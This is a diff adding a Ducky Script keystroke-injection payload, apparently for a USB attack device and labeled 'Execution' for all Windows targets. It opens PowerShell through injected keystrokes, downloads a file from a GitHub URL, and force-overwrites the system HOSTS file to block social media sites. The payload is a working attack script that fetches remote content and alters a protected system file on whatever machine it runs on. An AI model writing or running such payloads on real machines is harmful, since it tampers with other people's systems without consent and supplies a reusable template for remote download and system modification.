@@ -1,4 +1,26 @@
-REM
-REM
-REM
-
+REM Author: REDD (InfoSecREDD)
+REM Version: 0.12
+REM Category: Execution
+REM Target: All Windows
+DELAY 500
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+DELAY 2000
+REM *************************************************
+REM **   Deny all Social Media Websites
+REM ** ==================================
+REM ** https://raw.githubusercontent.com/InfoSecREDD/REDD-Demo/main/DNS-POI/killsocials.lst
+REM **
+REM **   DEFAULT Microsoft Hosts File
+REM ** ==================================
+REM ** https://raw.githubusercontent.com/InfoSecREDD/REDD-Demo/main/DNS-POI/HOSTS
+REM *************************************************
+REM  - Change the URI to the correct path.
+STRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/InfoSecREDD/REDD-Demo/main/DNS-POI/killsocials.lst' -OutFile 'HOSTS';Copy-Item 'HOSTS' -Destination "$Env:windir\System32\drivers\etc\HOSTS" -Recurse -force;
+ENTER
+DELAY 500
+GUI d
